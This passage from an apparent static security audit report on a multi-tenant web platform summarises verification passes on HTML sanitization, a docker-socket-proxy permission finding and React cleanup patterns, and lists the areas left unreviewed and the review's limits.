**Reviewed in verification passes (previously listed as uncertain):**
* GrapesJS parse/serialize (`gjs-parse`, `gjs-blocks`) + `hydrate.js`: `parseHtml` sanitizes by default (drops `on*`/`javascript:`; `<script>` off by default); scripts are opt-in only through the deliberate Custom Code block; content data bindings use `textContent` for `text:` and `innerHTML` only for the explicit `html:` target (the SEC-13 vector). Consistent author-trust boundary, no new finding.
* `tecnativa/docker-socket-proxy` ruleset: **extracted from the image** and confirmed — `CONTAINERS=1 POST=1` opens the whole `/containers` namespace to POST (SEC-01 / INF-01), not merely the granular stop/kill actions.
* apps/admin large features (`ide/agent/useAgentSession`, `assistant/useAssistantSession`, `ide/preview/usePreview`, `site-source/useSiteLiveUpdates`, `site-source/MonacoEditor`, `IdePage`) for React correctness: consistent, correct patterns throughout — `AbortController` refs, `cancelled`/`disposed` guards, stale-request-id checks, cleanup returns that stop SignalR connections and dispose Monaco models/subscriptions, and refs (not deps) for mutable values to avoid reconnect churn. No leaks or races found. (The lint `modelsRef.current`-in-cleanup warning is a false positive: the Map identity is stable and disposing its contents at unmount is correct.)

**Not fully reviewed / genuinely remaining:**
* `CertificateRenewalService` / `EdgeTlsPreflight` (reliability/UX, not a security boundary).
* A line-by-line React review of every remaining admin feature page (the six largest / most security-relevant were reviewed).

**Limitations:** This was a static, evidence-based review. No dynamic testing, exploitation, or live environment was used; HIGH/CRITICAL findings were verified by code and configuration tracing and by attempting to disprove each, but not by execution. Severity reflects the shared-multi-tenant-platform context.

